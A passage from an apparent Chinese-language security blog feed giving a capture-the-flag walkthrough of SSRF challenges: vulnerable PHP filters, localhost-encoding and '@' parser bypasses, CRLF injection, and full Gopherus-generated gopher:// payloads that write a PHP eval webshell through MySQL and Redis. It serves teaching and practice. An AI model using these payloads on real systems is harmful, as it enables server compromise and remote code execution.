data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 进行了过滤，过滤掉了localhost和127.0.0.*</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//启用时会将头文件的信息作为数据流输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">url=http://0x7F.0.0.1/flag.php   16进制</p><p style="color:blue;">url=http://0177.0.0.1/flag.php    8进制</p><p style="color:blue;">url=http://0.0.0.0/flag.php</p><p style="color:blue;">url=http://0/flag.php</p><p style="color:blue;">url=http://127.127.127.127/flag.php</p></blockquote><h5 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里过滤了。数字127等，我们不能利用句号或者短网址进行绕过</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>十六进制 url=<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制 url=<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>10 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>16 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a><br>短网址方式：127.0.0.1也可以写成127.1<br>用CIDR绕过localhost<br>url=<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><h5 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-限制为http-www-xxx-com-域名时（利用-）"><a href="#5-2-限制为http-www-xxx-com-域名时（利用-）" class="headerlink" title="5.2 限制为http://www.xxx.com 域名时（利用@）"></a>5.2 限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</h4><p>可以尝试采用http基本身份认证的方式绕过如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异./">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异。</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p><h5 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code> ，我们可以用@方式进行绕过，如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p><h4 id="5-3-SSRF利用-Gopher-协议拓展攻击面"><a href="#5-3-SSRF利用-Gopher-协议拓展攻击面" class="headerlink" title="5.3 SSRF利用 Gopher 协议拓展攻击面"></a>5.3 SSRF利用 Gopher 协议拓展攻击面</h4><h5 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Web359登录界面.png" alt="1666666568052" style="zoom:25%;" /><p>随便输一个用户名，进入后台<del>靶场并没有做</del>，使用hackbar工具打开，我们可以看到在登录时前后端传参的方法</p><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;https%3A%2F%2F404.chall.ctf.show%2F&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SSRF漏洞出现在returl参数上， 利用gopher协议去打无密码的mysql 。</p><p>这里要用到工具Gopherus来生成payload进行rce ，我们可以做一个一句话木马写进去</p><blockquote><p>工具下载地址: <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> </p></blockquote><blockquote><p>select ‘<?php eval($_POST[1]); ?>‘ into outfile ‘/var/www/html/1.php</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面.png" style="zoom: 67%;" /><blockquote><p>这里得到的参数必须在进行一次URL编码才能进行利用。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2501%2500%2500%2500%2501&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个是check.php 不过没找到什么可以用的东西….</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|dict/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">_request</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">_request</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span><span class="token variable">$https</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置不需要头信息</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取页面内容，但不输出</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$https</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做服务器认</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做客户端认证</span>        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">==</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求是post方式</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置post请求数据</span>        <span class="token punctuation">&#125;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行访问</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭curl，释放资源</span><span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ctfshow{2abfc1df-79f7-49a9-b02a-d5d5908d150e}</p></blockquote><h5 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p>当然这个题目肯定是shell，这次的flag并不在本地的flag文件中。题目提示我们打redis，同样用Gopherus工具来生成我们的payload。同样写一句话木马进去。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面2.png" style="zoom: 80%;" /><blockquote><p>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</p></blockquote><h4 id="5-4-其他绕过方式："><a href="#5-4-其他绕过方式：" class="headerlink" title="5.4 其他绕过方式："></a>5.4 其他绕过方式：</h4><p><strong>利用特殊域名利用[::]</strong></p><p><strong>可以利用[::]来绕过localhost</strong></p><blockquote><p style="color:orange;">http://169.254.169.254>>http://[::169.254.169.254] </p></blockquote><blockquote><p style="color:orange;">利用句号: 127。0。0。1 >>> 127.0.0.1</p></blockquote><p><strong>CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车        %0a-&gt;0x0a-&gt;\n换行        进行HTTP头部注入</p><p style="color:orange;">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </p></blockquote><p><strong>封闭的字母数字</strong></p><h3 id="六、常见限制及对应方式："><a href="#六、常见限制及对应方式：" class="headerlink" title="六、常见限制及对应方式："></a>六、常见限制及对应方式：</h3><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><blockquote><p style="color:orange;">采用http基本身份认证的方式绕过，即@http://www.xxx.com@www.xxc.com</p></blockquote><p>2.限制请求IP不为内网地址</p><blockquote><p style="color:orange;">当不允许ip为内网地址时：采取短网址绕过、采取特殊域名、采取进制转换</p></blockquote><p>3.限制请求只为http协议</p><blockquote><p style="color:orange;">采取302跳转、采取短地址</p></blockquote><h3 id="七、免责声明"><a href="#七、免责声明" class="headerlink" title="七、免责声明"></a>七、免责声明</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF漏洞 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu之docker安装：</title>
      <link href="/2022/09/23/Ubuntu_Docker%E5%AE%89%E8%A3%85/"/>
      <url>/2022/09/23/Ubuntu_Docker%E5%AE%89%E8%A3%85/</url>
      
